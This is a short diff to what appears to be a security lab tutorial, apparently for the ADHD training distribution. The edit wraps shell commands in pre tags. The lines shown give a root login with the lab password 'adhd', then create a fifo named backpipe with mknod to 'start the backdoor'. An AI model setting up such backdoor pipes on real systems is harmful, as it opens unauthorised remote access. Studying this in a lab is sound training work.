@@ -26,7 +26,7 @@ And, open a Ubuntu command prompt:
 
 On your Linux terminal, please run the following command:
 
-$`sudo su -`
+<pre>`sudo su -`</pre>
 
 The password is adhd.
 
@@ -35,7 +35,7 @@ This will get us to a root prompt. We want to do this because we want to have a 
 
 We will next need to create a fifo backpipe:
 
-/#`mknod backpipe p`
+<pre>`mknod backpipe p`
 
 Next, let's start the backdoor:
 
